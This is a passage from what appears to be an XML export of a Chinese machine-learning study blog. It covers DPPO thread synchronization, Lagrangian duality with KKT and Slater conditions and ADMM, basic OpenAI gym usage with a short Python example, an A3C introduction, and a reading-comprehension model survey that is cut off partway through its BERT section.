在主网络更新参数时，所有的副网络应该停止收集数据，因为这时副网络只会收集到过时的数据。所以要保证在主网络对应的线程运行时，其他所有的线程都停止。而这用锁 lock 是没办法解决的，因为锁是解决的多个线程争夺同一资源的情况，而上述情况显然不属于。代码中用的是事件 event 的方式，后面会详细介绍。 坑3. 莫烦的代码中在更新网络参数时使用了一个循环更新10次，当时我想这样和把学习率提高10倍有什么不同吗？你别说，还真不一样，因为 actor 网络的损失函数和新的策略相关的，当策略改变后网络的梯度也会发生改变。 坑4. 输入的数据的维度问题。这个问题在之前的代码中就遇到过了，当时没太在意。比如输入的数据是二维的，期望的输出也是二维的，但是由于中间某些操作会导致输出多了一个多余的维度，变为了三维。这不仅会导致数据的维度不匹配，好像还可能会影响到最终训练的结果。 多线程中的 Event在 threading.Event() 中，可以用 flag=threading.Event() 来设置多个内部标识。其作用类似于操作系统中同步和互斥用到的标识，常用的函数有： flag.set()：将内部标识设为True，默认为False flag.wait()：如果内部标识为False，则线程阻塞，直到内部标识变为True flag.clear()：将内部标识设为False flag.is_set()：返回内部标识的值 在 DPPO 的代码中，将负责收集数据的副网络看作一类，将负责更新网络参数和采取动作的主网络看作一类，分别设置一个内部标识。一开始主网络的标识为 False，副网络的为 True，此时副网络收集数据；当数据收集到一定数量时，将副网络标识设为 False，主网络的设为 True，此时主网络更新；主网络更新完毕后，将自己的标识设为 False，将副网络的设为 True。不断重复以上步骤就可以让收集数据和更新网络两个步骤交替进行。]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[优化方法：原问题和拉格朗日对偶问题（primal-dual）]]></title>
    <url>%2F2019%2F11%2F27%2Fprimal-dual%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关原问题和拉格朗日对偶问题，以及它们之间的关系，从而引出弱对偶性和强对偶性以及 KKT 条件和 Slater 条件。 一、原问题与拉格朗日函数1. 原问题优化问题一般都可以写为下面的形式：$$\min f_0(x),\quad x\in R^n$$ $$s.t.\quad f_i(x)\leq0,\quad i=1,2,…,m$$ $$\quad \quad h_j(x)=0,\quad j=1,2,…,p$$ 以上形式被成为原问题，即求解一个满足 m 个不等式约束和 p 个等式约束的函数 $f_0(x)$ 的最小值。实际上我们并不关心最小值是什么，而是关心最小值在 x 是什么的时候取得。下面的讨论如果不加以说明都是针对一般的优化问题来说的。 2. 拉格朗日函数解决带约束的条件的优化问题的一般解决办法是拉格朗日乘子法，也就是先写出拉格朗日函数，再让拉氏函数对 x 求导得到导数为 0 的点，将这些点带入原函数，则其中的最大值即为原函数的最大值，最小值即为原函数的最小值。上述优化问题的拉氏函数为：$$L(x,u,v)=f_0(x)+\sum_{i=1}^mu_if_i(x)+\sum_{j=1}^pv_jh_j(x)$$其中 $u_i\geq0$，$v_j\in R$，这是因为在可行域内 $f_i(x)\leq0$，所以当 $u_i\geq0$ 时， $\sum_{i=1}^mu_if_i(x)$ 的最大值为 0；因为 $h_j(x)=0$，所以 $\sum_{j=1}^pv_jh_j(x)$ 恒为0，$v_j$ 可以取任意值。这样就保证了 $L(x,u,v)$ 的最大值为原函数 $f_0(x)$ ，即 $\max_{u,v} L(x,u,v)=f_0(x)$。 对于固定的 x 来说，拉氏函数 $L(x,u,v)$ 为 $u$ 和 v 的仿射函数。 二、对偶问题和对偶函数1. 拉格朗日对偶函数由此一来，就把原来的求解带约束条件的原函数转换为了不带约束条件的拉格朗日函数。求解 $\min_x f_0(x)$ 就等价于求解 $\min_x\max_{u,v}L(x,u,v)$。但是该式子并不容易求解，所以引入了对偶问题。 $\min_x\max_{u,v}L(x,u,v)$ 和原问题等价，也被称作原问题；$\max_{u,v}\min_xL(x,u,v)$ 被称作原问题的对偶问题，从形式上看原问题和对偶问题只是互换了一下最大最小的位置。而对偶问题中的 $\min_x L(x,u,v)$ 就是拉格朗日对偶函数（注意不是对偶问题），拉格朗日对偶函数就是拉格朗日函数关于 x 取最小值，即：$$g(u,v)=\inf_{x\in D}L(x,u,v)=\inf_{x\in D}[f_0(x)+\sum_{i=1}^mu_if_i(x)+\sum_{j=1}^pv_jh_j(x)]$$其中 $\inf_{x\in D}$ 表示函数逐点对 x 求下确界，也就是对任意的 $u$ 和 v 求出一个使得 $L(x,u,v)$ 最小的 x 。当拉氏函数没有下确界时，定义下确界为 $-\infty$，即 $g(u,v)=-\infty$； D 是可行域。拉格朗日对偶函数是一个凹函数，也就是说它存在一个唯一的极大值点。 2. 拉氏对偶函数为凹函数证明先来感性的看一下这个问题，因为是拉氏函数是关于 u 和 v 的仿射函数，所以可以用下面两张示意图表示对 x 逐点取最小值的结果： 上图是随便画的多个仿射函数（直线是最简单的仿射函数），对其逐点取最小值得到下图： 可以发现结果是一个凹函数。 下面再来理性的推导一下，为了叙述方便，记 $\gamma=(u,v)$，则拉格朗日对偶函数为：$$g(\gamma)=\min{L(x_1,\gamma),L(x_2,\gamma),…,L(x_n,\gamma)}$$即针对变量 x 所有可能的取值求最小值。 要证明拉格朗日对偶函数 $g(\gamma)$ 是凹函数，即证明：$$g(\theta\gamma_1+(1-\theta)\gamma_2)\geq\theta g(\gamma_1)+(1-\theta)g(\gamma_2)$$证：$$g(\theta\gamma_1+(1-\theta)\gamma_2)$$根据拉氏对偶函数的定义，有$$=\min{L(x_1,\theta\gamma_1+(1-\theta)\gamma_2),L(x_2,\theta\gamma_1+(1-\theta)\gamma_2),…,L(x_n,\theta\gamma_1+(1-\theta)\gamma_2)}$$由于 $L(x,\gamma)$ 是关于 $\gamma$ 的仿射函数，而仿射函数是凹函数（当然同样也是凸函数），有$$\geq\min{\theta L(x_1,\gamma_1)+(1-\theta)L(x_1,\gamma_2),\theta L(x_1,\gamma_1)+(1-\theta)L(x_2,\gamma_2),…,\theta L(x_n,\gamma_1)+(1-\theta)L(x_n,\gamma_2)}$$上式中带参数 $\theta$ 的项都不小于下式中的第一项，上式中带参数 $1-\theta$ 的项都不小于下式中的第二项，故$$\geq\theta\min{L(x_1,\gamma_1),L(x_2,\gamma_1),…,L(x_n,\gamma_1)}+(1-\theta)\min{L(x_1,\gamma_2),L(x_2,\gamma_2),…,L(x_n,\gamma_2)}$$根据凹函数的定义，有$$=\theta g(\gamma_1)+(1-\theta)g(\gamma_2)$$故拉氏对偶函数为凹函数。 3. 仿射函数和凸函数的关系凸集 ：若集合 C 内任意两个不同点的 线段 仍在集合 C 内，则称集合 C 为凸集。 如果一个函数是凸函数，则该函数的图像上方区域一定是凸集，反之亦然。 仿射集 ：若通过集合 C 中任意两个不同点的 直线 仍在集合 C 内，则称集合 C 为仿射集。 n 维空间的仿射集为 n-1 维超平面，比如二维空间的直线，三维空间的平面都是仿射集。 由以上定义可知，如果一个集合是仿射集，那么它也一定是凸集。 仿射函数 ：最高次数为1的多项式函数。常数项为零的仿射函数称为线性函数。 三、原问题与对偶问题的关系1. 原问题与对偶问题的关系因为 $\min_x f_0(x)=\min_x\max_{u,v}L(x,u,v)\geq\max_{u,v}\min_xL(x,u,v)=max_{u,v}g(u,v)$，所以可以用拉格朗日对偶的最大值去逼近原函数的最小值。下面来证明一下上面式子的正确性： 因为任何函数都不大于其对某个变量求最大值，故：$$f(x,y)\leq\max_x f(x,y)$$上式两边对 y 求最小值得：$$\min_yf(x,y)\leq\min_y\max_x f(x,y)$$上式中不等式的前面是一个关于 x 的函数，不妨记为 G(x)，不等式后面是一个定值，不妨记为 A，所以说 $G(x)\leq A$，所以 G(x) 的最大值也不大于 A：$$\max_x\min_yf(x,y)\leq\min_y\max_x f(x,y)$$得证。 2. 弱对偶和强对偶我们用 $p^{*}$ 表示原问题的最优解，即 $p^*=\min_xf_0(x)$；用 $d^$ 表示拉氏对偶函数的最优解，即 $d^\=\max_{u,v}g(u,v)$。并定义原问题的最优解与拉氏对偶问题的最优解之间的差值为 对偶间隙（dual gap），即 $p^*-d^*$。 前面我们已经证明了原问题的最优解大于等于对偶问题的最优解，即$p^*\geq d^*$，这个性质被称作 弱对偶性 ，也可以表示为对偶间隙大于等于 0，即 $p^*-d^*\geq 0$。即使当 $p^*$ 和 $d^*$ 无限时，弱对偶性仍然成立。如果原问题无下界，则对偶问题也无下界；如果对偶问题无上界，则原问题也无上界，即原问题不可行。 如果原问题的最优解和拉氏对偶问题的最优解相等，也就是对偶间隙为 0，则 强对偶性 成立。 四、约束准则强对偶性成立的条件一般被称为 约束准则。下面主要讲解两个约束准则—— KKT 条件 和 Slater 条件。 1. KKT 条件之前证明了我们可以用拉格朗日对偶的最大值去逼近原函数的最小值的思路是正确的，但是什么时候两者的最大值和最小值相等呢？ 首先假设函数 $f_0(x),…,f_m(x),h_1(x),…,h_p(x)$ 都可微，但并不假设这些函数为凸函数，则拉氏对偶函数：$$g(u^*,v^*)=\inf_x[f_0(x)+\sum_{i=1}^mu_i^*f_i(x)+\sum_{j=1}^pv_j^*h_j(x)]$$因为一个函数的下确界（最小值）不大于函数本身，带入最优解 $x^*$ 后仍如此，故：$$\leq f_0(x^*)+\sum_{i=1}^mu_i^*f_i(x^*)+\sum_{j=1}^pv_j^*h_j(x^*)$$又因为后两项的最大值为 0，故：$$\leq f_0(x^*)$$上面三式中，$u^*$、$v^*$ 和 $x^*$ 分别是拉格朗日对偶函数和原函数的最优解。所以说要想让拉格朗日对偶函数的最大值和原函数最小值相等，需要让上面三式中的小于等于号全部取等号。 因为拉格朗日函数在 $x^*$ 处取得极小值，因此拉氏函数在 $x^*$ 处的导数为 0 。所以第一个 $\leq$ 取等号的条件是拉氏函数对 $x^*$ 的偏导为 0，即：$$\nabla f_0(x^*)+\sum_{i=1}^mu_i^*\nabla f_i(x)+\sum_{j=1}^pv_j^*\nabla h_j(x)=0\quad\quad\quad\quad 条件 (1)$$第二个 $\leq$ 取等号的条件是 $\sum_{i=1}^mu_i^*f_i(x^*)$ 和 $\sum_{j=1}^pv_j^*h_j(x^*)$ 全部为 0，前面说了，后者恒等于 0，而前者为 0 的条件是：$$\sum_{i=1}^mu_i^*f_i(x^*)=0$$但是因为在可行域内，以上求和项的每一项都是非正的，因此以上条件等价于：$$u_i^*f_i(x^*)=0\quad\quad\quad\quad\quad\quad\quad条件(2)$$以上 2 个约束条件，再加上优化问题自身的三个约束条件就得到了著名的 KKT 条件，和 KMP 算法的名称类似，所谓的 KKT 条件的命名其实是三位科学家名字的英文首字母的组合，KKT 条件即：$$f_i(x^*)\leq0,\quad i=1,…,m$$ $$h_i(x^*)=0,\quad i=1,…,p$$ $$u_i^*\geq0,\quad i=1,…,m$$ $$\nabla f_0(x^*)+\sum_{i=1}^mu_i^*\nabla f_i(x)+\sum_{j=1}^pv_j^*\nabla h_j(x)=0$$ $$u_i^*f_i(x^*)=0$$ KKT 条件中的条件 (2) $u_i^*f_i(x^*)=0$ 也被称为 互补松弛性，我们可以将互补松弛条件等价地改写为：$$u_i^*&gt;0\Rightarrow f_i(x^*)=0$$或者：$$f_i(x^*)&lt;0\Rightarrow u_i^*=0$$这是因为在可行域内有 $u_i^*\geq 0$ 并且 $f_i(x^*)\leq 0$。 2. Slater 条件文章开始讲述的是一般的优化问题，而凸优化问题在以上形式的基础上多了几个限制条件：1. $f_i(x)$ 为凸函数（$i=0,1,…,m$） 2. $h_j(x)$ 为仿射函数（$j=1,2,…,p$）。一般情况下强对偶性不成立，但如果原问题是凸优化问题，则强对偶性通常（但不总是）成立。将一般的优化问题转化为凸优化问题的好处是凸优化只有一个极小值点，也就是说凸优化问题的局部最优解即全局最优解。 如果原始问题为凸优化问题，并且存在一点 x 使得所有的不等式约束都小于 0，即：$$f_i(x)&lt;0,\quad i=1,…,m$$则强对偶性成立。 上述条件就是所谓的 Slater 条件，而满足上述条件的点被称为 严格可行，这是因为不等式约束严格成立。上述表达即 Slater 定理，即当 Slater 条件成立且原问题是凸优化问题时，强对偶性成立。 当不等式约束函数 $f_i(x)$ 中有一些函数是仿射函数时，Slater 条件可以进一步改进。我们假设前 k 个不等式约束函数为仿射函数，则强对偶性成立的条件（即改进后的 Slater 条件）为：存在一点 x 使得前 k 个不等式约束函数小于等于 0，而其他不等式约束函数小于 0，即$$f_i(x)\leq 0,\quad i=1,…,k$$ $$f_i(x)&lt;0,\quad i=k+1,…,m$$ 换句话说，仿射函数不等式不需要严格成立。 五、一阶原对偶方法一阶原对偶方法应该就是利用一阶导数来求解最优解的方法，常见的有增广拉格朗日算法和交替方向乘子法两种。这段话的表述我不是特别确定是否完全正确。 1. ALM增广拉格朗日乘子法（Augmented Lagrange Method），是用于解决等式约束条件下的优化问题。相对于朴素拉格朗日，它增加对偶上升法的鲁棒性和放松函数f的强凸约束，使得转换后的问题能够更容易求解，不至于因条件数变大不好求。 形式：在朴素的拉格朗日函数的基础上加一个惩罚项 $\frac{\rho}{2}\cdot||\varphi(x)||_2^2$，即对于只带等式约束的凸优化问题$$\min_x f(x)$$ $$s.t.\quad\varphi(x)=0$$ 其中 f(x) 为凸函数，其增广拉格朗日函数为：$$L(x,\lambda)=f(x)+\lambda\cdot\varphi(x)+\frac{\rho}{2}\cdot||\varphi(x)||_2^2$$其中 $\rho&gt;0$ 为惩罚因子。 更新迭代 假设 $\lambda^k$ 为当前 k 轮迭代的对偶问题最优解 求解 $x^{k+1}$：$x^{k+1}=\arg\min_xL(x,\lambda^k)$，其中 $L(x,\lambda)$ 定义如上式 梯度上升法更新 $\lambda$：$\lambda^{k+1}=\lambda^k+\alpha\cdot\frac{\partial L(x,\lambda)}{\partial\lambda}|_{x=x^{k+1},\lambda=\lambda^k}$ 对于带有不等式约束的凸优化问题，可以先将其转换为带等式约束的优化问题，再进行求解，即带有不等式约束的凸优化问题为：$$\min_x f(x)$$ $$s.t.\quad\varphi(x)\geq0$$ 其等价形式为：$$\min_x f(x)$$ $$s.t.\quad\varphi(x)-v=0$$ $$v\geq0$$ 带有约束的增广拉格朗日函数为：$$L(x,\lambda)=f(x)+\lambda\cdot(\varphi(x)-v)+\frac{\rho}{2}\cdot||\varphi(x)-v||_2^2$$ $$s.t.\quad v\geq0$$ 算法迭代更新步骤为： 固定 $\lambda$，更新 x, v：$$(x,v)=\arg\min_{x,v}L_t(x,\lambda)$$ $$=\arg\min_{x,v}f(x)+\lambda\cdot(\varphi(x)-v)+\frac{\rho}{2}\cdot||\varphi(x)-v||_2^2$$ $$s.t.\quad v\geq02.$$ 更新 $\lambda$：$${\lambda*}_i=\lambda_i-\rho\cdot(\varphi(x)-v)$$ 2. ADMM交替方向乘子算法（Alternating Direction Method of Multipliers）：将对偶上升法的可分解性和乘子法的上界收敛属性融合在一起的算法。 所谓可分解性就是指待求解的凸优化问题中的函数和限制条件都可以分为多块，下面我们以最简单的形式为例——可分为两块的凸优化问题：$$p*=\min_{x,z} f(x)+g(z)$$ $$s.t.\quad Ax+Bz=c$$ 其中 $x\in R^n$，$z\in R^m$，$A\in R^{p\times n}$，$B\in R^{p\times m}$，$c\in R^p$，函数 $f:R^n\rightarrow R$，$g:R^m\rightarrow R$ 都是凸函数。 该凸优化问题的增广拉格朗日函数为：$$L_\rho(x,z,y)=f(x)+g(z)+y^T\cdot(Ax+Bz-c)+(\frac{\rho}{2})\cdot||Ax+Bz-c||2^2$$然后对增广拉格朗日函数 $L(x,z,y)$ 使用对偶上升法求解：$$(x^{k+1},z^{k+1}):=\arg\min{x,z}L_\rho(x,z,y^k)$$ $$y^{k+1}:=y^k+\rho\cdot(Ax^{k+1}+Bz^{k+1}-c)$$ 对偶上升法的本质就是原始变量的迭代方向取拉格朗日函数对原始变量的次微分，对偶变量的迭代方向取拉格朗日函数对对偶变量的次微分（$\frac{\partial L_\rho}{\partial y}$）。 可以注意到，增广拉格朗日问题更新是求对两个原始变量联合最小化，即变量 x, z 一起更新，而 ADMM（交替方向的乘子法） 是在原来的基础改成变量 x, z 单独交替更新，即$$x^{k+1}:=\arg\min_xL_\rho(x,z^k,y^k)$$ $$z^{k+1}:=\arg\min_zL_\rho(x^{k+1},z,y^k)$$ $$y^{k+1}:=y^k+\rho\cdot(Ax^{k+1}+Bz^{k+1}-c)$$ ADMM 算法更新还有一种等价的方式，首先我们定义残差（residual）为 $r^k:=Ax^k+Bz^k-c$，并定义缩放的对偶变量（scaled dual variable）为 $u^k:=(\frac{1}{\rho})y^k$，则有$$(y^k)^Tr^k+(\frac{\rho}{2})\cdot||r^k||_2^2=(\frac{\rho}{2})\cdot||r^k+(\frac{1}{\rho})y^k||_2^2-(\frac{1}{2\rho})\cdot||y^k||_2^2$$ $$=(\frac{\rho}{2})\cdot||r^k+u^k||_2^2-(\frac{\rho}{2})\cdot||u^k||_2^2$$ 所以，我们可以将 ADMM 算法的更新方式改写为：$$x^{k+1}:=\arg\min_x{f(x)+(\frac{\rho}{2})\cdot||Ax+Bz^k-c+u^k||_2^2}$$ $$z^{k+1}:=\arg\min_z{g(z)+(\frac{\rho}{2})\cdot||Ax^{k+1}+Bz-c+u^k||_2^2}$$ $$u^{k+1}:=u^k+Ax^{k+1}+Bz^{k+1}-c$$ 这种形式的 ADMM 算法比前一种更为简洁，我们一般把前一种形式称为 ADMM 的非缩放（unscaled）形式，而这种是缩放（scaled）形式。 3. ADMM 的收敛性假设1：函数 f, g 为凸函数，并且是 closed 和 proper 的。 假设2：（非增广）拉格朗日函数 $L_0$ 至少有一个鞍点（saddle point）。 上述假设1保证了 $\arg\min_x L_\rho(x,z^k,y^k)$ 和 $\arg\min_z L_\rho(x^{k+1},z,y^k)$ 的解是一定存在的；假设2保证了强对偶性成立，即原问题的最优值等于对偶问题的最优值。基于这两个假设，可以得到 残差收敛：当 $k\rightarrow\infty$ 时，有 $r^k\rightarrow0$，也就是说最终的解是可行的。 目标函数值收敛：当 $k\rightarrow\infty$ 时，有 $f(x^k)+g(z^k)\rightarrow p*$，也就是说最终的目标函数值是最优的。 对偶变量收敛：当 $k\rightarrow\infty$ 时，有 $y^k\rightarrow y*$，也就是说最终对偶变量的值收敛于某个对偶变量的最优解。 值得注意的是，原变量 $x^k,z^k$ 不一定会收敛到一个最优解 $x,z$。]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习番外篇之 OpenAI-gym 环境的介绍和使用]]></title>
    <url>%2F2019%2F11%2F14%2Fgym%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关 OpenAI gym 中怎么查看每个环境是做什么的，以及状态和动作有哪些可取的值，奖励值是什么样的。然后给出一个完整的代码，最后再说明一下 gym 中的 done 标志的含义。 gym 是 OpenAI 针对强化学习推出的诸多环境的集合，我们可以直接在这些环境上使用各种强化学习算法来训练我们模型，这样我们就可以专注于强化学习算法本身而不是编写环境了。至于 gym 的安装过程，我就不再说了，网上的教程已经非常多了。值得一提的是，目前 gym 已经基本支持 windows 系统了。 对于一个 gym 中的环境，我们怎么查看这个环境要求你做什么、状态和动作是什么样的，以及奖励是什么呢？这一点 gym 并不是十分友好，我在其官网上没有找到明确的说明。这个问题可以通过在 github 上 gym 对应的仓库来找到说明。 首先在 github 上搜索 “openai/gym”，然后选择 star 数最高的那个仓库，然后点击 “Wiki” 就可以在右边看到各种 gym 中的环境名称了，点击想要查看的环境名称就得到了有关该环境的相应介绍。如下图所示： 要是嫌麻烦，也可以直接点击以下链接查看 Gym。 除了上述所说的方式，还可以用代码的方式来查看环境的某些属性。在 gym 中的环境主要可以分为两类，一类是动作是连续的，另一类是动作是离散的。在某些地方这两者会有轻微的差异，这一部分还是直接看代码和注释吧。 123456789101112131415161718192021222324import gymenv=gym.make("MountainCar-v0") #创建对应的游戏环境env.seed(1) #可选，设置随机数，以便让过程重现env=env.unwrapped #可选，为环境增加限制，对训练有利#----------------------动作空间和状态空间---------------------#print(env.action_space) #动作空间，输出的内容看不懂print(env.action_space.n) #当动作是离散的时，用该方法获取有多少个动作# env.observation_space.shape[0] #当动作是连续的时，用该方法获取动作由几个数来表示print(env.action_space.low) #动作的最小值print(env.action_space.high) #动作的最大值print(env.action_space.sample()) #从动作空间中随机选取一个动作# 同理，还有 env.observation_space，也具有同样的属性和方法（.low和.high方法除外）#-------------------------------------------------------------#for episode in range(100): #每个回合 s=env.reset() #重新设置环境，并得到初始状态 while True: #每个步骤 env.render() #展示环境 a=env.action_space.sample() # 智能体随机选择一个动作 s_,r,done,info=env.step(a) #环境返回执行动作a后的下一个状态、奖励值、是否终止以及其他信息 if done: break 大家可以看到在以上代码 s_,r,done,info=env.step(a) 中有个 done 标志，从字面意思来看 done 是环境是否做完的一个标志。但是实际没这么简单，就拿 MountainCar、CartPole 和 Pendulum 这三个环境为例。MountainCar 环境中当小车拿到旗子后就算成功的完成任务了，此时 done 为 True。CartPole 环境中当小车和杆子跑出屏幕之外后，就相当于出错了，需要重新开始，这时 done 也为 True。但是对于 Pendulum 环境来说，它的目标是将杆子树立起来，但是该环境中动作可以无限的进行下去，done 永远为 False，所以这种情况下只能用步数达到一定数量来判定是否该结束。]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[强化学习（8）：Asynchronous Advantage Actor-Critic（A3C）算法]]></title>
    <url>%2F2019%2F11%2F10%2FA3C%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关 A3C 算法的相关内容。 一、A3C 算法直接引用莫烦老师的话来介绍 A3C 算法：Google DeepMind 提出的一种解决 Actor-Critic 不收敛问题的算法。它会创建多个并行的环境，让多个拥有副结构的 agent 同时在这些并行环境上更新主结构中的参数。并行中的 agent 们互不干扰，而主结构的参数更新受到副结构提交更新的不连续性干扰，所以更新的相关性被降低，收敛性提高。 除了上述提到的之外，在 A3C 算法中拥有副结构的 agent 还会定期地获取主结构的参数以更新自己的策略。A3C 算法实际上就是将 Actor-Critic 放在了多个线程中进行同步训练。可以想象成几个人同时在玩一样的游戏，而他们玩游戏的经验都会同步上传到一个中央大脑，然后他们又从中央大脑中获取最新的玩游戏方法。 下图是 A3C 网络结构的示意图： 二、A3C 算法流程]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[NLP 作业：机器阅读理解（MRC）综述]]></title>
    <url>%2F2019%2F11%2F08%2FMRC%2F</url>
    <content type="text"><![CDATA[本文主要是我的 NLP 作业——机器阅读理解的综述，内容很少涉及到模型的具体架构和相关理论的证明，而是注重于机器阅读理解发展历程，大体上有哪几类模型，并且讲解几个经典模型的特点以及它改进了之前模型的什么缺点。 目录一、机器阅读理解概述 机器阅读理解的常见任务 经典的机器阅读理解基本框架 机器阅读理解的发展历程 二、 经典机器阅读理解模型 Match-LSTM BiDAF QA-Net BERT ALBERT 三、机器阅读理解的研究趋势 基于外部知识的机器阅读理解 带有不能回答的问题的机器阅读理解 多条文档机器阅读理解 对话式阅读理解 参考文献 一、机器阅读理解概述所谓的机器阅读理解（Machine Reading Comprehension, MRC）就是给定一篇文章，以及基于文章的一个问题，让机器在阅读文章后对问题进行作答。 1. 机器阅读理解的常见任务MRC 的常见任务主要有四个：完形填空、多想选择、片段抽取和自由作答 （1）完形填空任务定义：将文章中的某些单词隐去，让模型根据上下文判断被隐去的单词最可能是哪个。 （2）多项选择任务定义：给定一篇文章和一个问题，让模型从多个备选答案中选择一个最有可能是正确答案的选项。 （3）片段抽取任务定义：给定一篇文章和一个问题，让模型从文章中抽取连续的单词序列，并使得该序列尽可能的作为该问题的答案。 （4）自由作答任务定义：给定一篇文章和一个问题，让模型生成一个单词序列，并使得该序列尽可能的作为该问题的答案。与片段抽取任务不同的是，该序列不再限制于是文章中的句子。 这四个任务构建的难易程度越来越难，对自然语言理解的要求越来越高，答案的灵活程度越来越高，实际的应用场景也越来越广泛。 2. 经典机器阅读理解的基本框架主要包括嵌入编码（Embedding）、特征抽取（Feature Extraction、Encode）、文章-问题交互（Context-Question Interaction）和答案预测（Answer Prediction）四个模块。 （1）嵌入编码将自然语言形式的文章和问题转化为固定维度的向量，以便让机器进行处理。常见的编码方式有 one-hot 表示、分布式词向量以及最近的 ELMo、GPT 和 Bert等。 （2）特征提取提取上下文信息，这一模块中常用的神经网络模型有：RNN、CNN和基于多头自注意力机制的Transformer结构。 （3）文章-问题交互利用文章和问题之间的交互信息来推测出文章中那些部分对于回答问题更为重要。该模块通常采用单向或双向的注意力机制来强调原文中与问题更为相关的部分。同时为了更深层次的挖掘文章和问题之间的关系，两者之间的交互可能会重复多次。 （4）答案预测该模块基于上述三个模块累积得到的信息进行最终的答案预测。该模块是高度任务相关的。对于完形填空任务，答案输出是原文中的一个词或实体，一种做法是将文中相同词的注意力权重得分进行累加，最终选择得分最高的词作为答案 ；对于多项选择任务，是从多个候选答案中挑选出正确答案,一般是对备选答案进行打分，选择得分最高的候选者作为答案；对于片段抽取任务，从原文中抽取一个连续的子片段作为答案，常用方法是 预测答案开始和结束位置的概率的边界模型；对于自由作答任务，答案灵活度最高，不再限制于原文中，可能需要进行推理归纳，现有的方法常用抽取和生成相结合的模式。 3. 机器阅读理解的发展历程2016年以前主要是统计学习的方法，2016年在 SQuAD 数据集发布之后，出现了一些基于注意力机制的匹配模型，如 match-LSTM 和 BiDAF 等。2018年之后浮现了各种预训练语言模型，如 BERT 和 ALBERT 等。 机器阅读理解数据集的发展极大的促进了机器阅读理解能力的发展，其中 SQuAD 是斯坦福大学推出的一个关于机器阅读理解的数据集，在2018年，斯坦福大学 NLP 团队又更新了该数据集的 2.0 版本，在新版本的数据集中加入了部分没有答案的问题。 下图中蓝色的是比较重要的几个模型，当然这只是一部分，不全。 二、经典的机器阅读理解模型前面提到过，机器阅读理解模型主要可以分为基于机器学习的、基于注意力机制的，以及基于预训练的。由于基于机器学习的模型效果都比较差，出现的时间也是较早之前了，所以下面只介绍基于注意力机制的几个经典模型—— match-LSTM、BiDAF 和 QA-Net，以及基于预训练的经典模型—— BERT 和 ALBERT。 1. match-LSTM该模型整合了 match-LSTM 和 Pointer-Net 两个模块，前者也是该作者提出的，但是用于文本蕴含任务。后者可以让预测答案中的单词来源于原文，而不是一个固定长度的词汇表。 在经典的 match-LSTM 中输入有两个，一个是前提（premise），另一个是假说（hypothesis）。其目的是判断根据前提是否能推断出假说。这里可以将问题看作是前提，把文章看作是假说，这样做相当于带着问题去文章中寻找答案。这解决了原文和问题的匹配问题。 Pointer-Net 用于从原文中选取答案，这里又提出了两种预测答案的模式： 序列模型（Sequence Model）：不做连续性假设，预测答案存在与原文的每一个位置； 边界模型（Boundary Model）：直接预测答案在原文中起始和结束位置。相比于序列模型加快了速度，并且效果更好。因此后来的模型普遍使用边界模型来进行答案范围的预测。 以上两个模块都运用了注意力机制，match-LSTM 模块使用注意力机制来计算文章中第 i 个 token 和问题中第 j 个 token 的匹配程度。Pointer-Net 模块使用注意力机制来预测位置。 2. BiDAFBiDAF 是 Bi-Directional Attention Flow（双向注意力流）的缩写。在该模型之前的注意力机制大致有三个特点： 如前面提到的 match-LSTM 模型，它们通常都是单向的从问题到文本的注意力权重； 注意力权重通常通过将上下文概括为固定长度的向量，进而从上下文中提取强相关信息用来回答问题； 在文本域中，注意力权重通常在时间上是临时动态的，其中当前时间步的注意权重是前一时间步参与向量的函数。 而 BiDAF 的贡献主要有：(1) 采用了双向的注意力机制 (2) 采用了多粒度结合的编码方式 BiDAF 的注意力机制特点如下： 计算了 query-to-context ( Q2C ) 和 context-to-query ( C2Q ) 两个方向的注意力信息，认为 C2Q 和 Q2C 实际上能够相互补充。 BiDAF 并不是将文本总结为一个固定长度的向量，而是将向量流动起来，以便减少早期信息加权和的损失； Memory-less，在每一个时刻，仅仅对问题和当前时刻的上下文进行计算，并不直接依赖上一时刻的注意力，这使得后面的注意力计算不会受到之前错误的注意力信息的影响； 多粒度结合的编码方式：网络的前三层分别对字符（character）、单词（word）和上下文（context）进行嵌入编码，也就是具有多层级不同粒度的表征编码器。 3. QA-Net在 QA-Net 之前的网络的关键技术主要有 RNN 模型和注意力机制。但是由于 RNN 的存在，所以模型的训练和推断速度都比较慢。QA-Net 就使用了卷积来代替传统的 RNN 结构，并采用了多种技巧（trick），较大的提高了模型的训练和推断速度，并保证了模型的精度。该模型中卷积用来捕获文本的局部信息，注意力用来学习每对单词之间的全局交互。 该模型还提出了新型的数据增强（data augment）技术 ，这种技术类似于CV中的数据增强技术。即先将原始句子从英语转化为其他语言，然后再将其转化回英语。这样的优点是可以增加可以使用的数据量。 该模型还使用了较多的技巧来减少参数、提升模型的速度，主要有：深度可分离卷积、层正则化、自注意力机制等。 深度可分离卷积 如果卷积核大小是 $3\times 3$，输入图像的通道数是5，输出图像的通道为10，则普通的卷积会在每个通道上设置一个 $3\times 3$ 卷积核，与对应的通道做完卷积后相加得到输出图像中的一个通道。用 10 组 4通道 $\times(3\times3)$ 卷积核重复以上过程，就得到了要求的 10 通道的图像。 如上图所示，而深度可分离卷积将以上过程拆分为了两个子过程，先用 4通道 $\times(3\times3)$ 卷积核在每个通道上做卷积，得到 4 通道的图像，然后用 10 组大小为 $1\times 1$，通道为 4 的卷积核与 4 通道的图像做卷积，得到最终 10 通道的输出图像。 这种卷积方式的优点是大大的降低了参数的数量，从而加快了模型的速度。 层正则化 类似于 batch normalization，因为数据在网络中每经过一层，其分布会发生变化，这会导致模型训练的收敛比较慢。layer norm 可以通过调整输出数据的均值和方差，让输出值符合一定的分布，从而减少训练时间。 自注意力机制 使用了 Multi-Head Attention（《Attention is all you need》），也就是 Attention 做多次然后拼接，类似于先用不同大小的卷积核分别做卷积，然后拼接。 4. BERTBERT 是 Bidirectional Encoder Representations from Transformers 的缩写，即来自 Transformer 的双向编码器表示，其中 Transformer 是另一种模型结构，BERT 就是在这种模型的基础上提出的。BERT 的最大特点是用遮蔽语言模型来利用上下文信息并使用自监督数据进行训练，并使用“next sentence 